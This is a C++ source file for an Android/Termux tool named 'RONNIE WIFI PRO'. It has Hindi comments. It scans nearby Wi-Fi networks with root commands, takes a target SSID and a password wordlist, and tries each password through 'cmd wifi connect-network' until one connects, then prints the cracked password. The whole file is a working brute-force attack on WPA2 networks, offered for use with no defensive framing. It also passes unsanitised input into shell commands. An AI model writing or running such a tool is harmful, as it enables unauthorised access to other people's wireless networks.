#include <iostream>
#include <string>
#include <fstream>
#include <unistd.h>

using namespace std;

#define RESET   "\033[0m"
#define RED     "\033[31m"
#define GREEN   "\033[32m"
#define YELLOW  "\033[33m"
#define CYAN    "\033[36m"

int main() {
    cout << CYAN << "===========================================" << endl;
    cout << "      RONNIE WIFI PRO (TERMUX FIX)         " << endl;
    cout << "===========================================" << RESET << endl;

    // 1. वाई-फाई स्कैन करें (बिना iwlib के)
    cout << YELLOW << "[*] Scanning Networks..." << RESET << endl;
    // 'cmd wifi list-scan-results' एंड्रॉइड का इनबिल्ट कमांड है
    system("su -c 'cmd wifi list-scan-results' | awk '{print $NF}' | grep -v 'SSID'");

    string ssid, wordlist;
    cout << CYAN << "\nTarget SSID: " << RESET;
    getline(cin >> ws, ssid);

    cout << CYAN << "Wordlist Path (e.g. /sdcard/pass.txt): " << RESET;
    getline(cin >> ws, wordlist);

    ifstream file(wordlist);
    if (!file.is_open()) {
        cout << RED << "[-] Error: Wordlist nahi mili!" << RESET << endl;
        return 1;
    }

    string pass;
    int line = 0;
    while (getline(file, pass)) {
        line++;
        if (pass.length() < 8) continue;
        if (!pass.empty() && pass.back() == '\r') pass.pop_back();

        cout << "[" << line << "] TRYING: " << pass << flush;

        // एंड्रॉइड के लिए कनेक्शन कमांड
        string cmd = "su -c 'cmd wifi connect-network " + ssid + " wpa2 " + pass + " > /dev/null 2>&1'";
        
        int status = system(cmd.c_str());

        if (status == 0) {
            cout << GREEN << " -> [SUCCESS!]" << RESET << endl;
            cout << GREEN << "\nPassword Found: " << pass << RESET << endl;
            break;
        } else {
            cout << RED << " -> [FAILED]" << RESET << endl;
        }
        // मोबाइल हार्डवेयर के लिए थोड़ा गैप जरूरी है
        usleep(1000000); 
    }

    file.close();
    return 0;
}
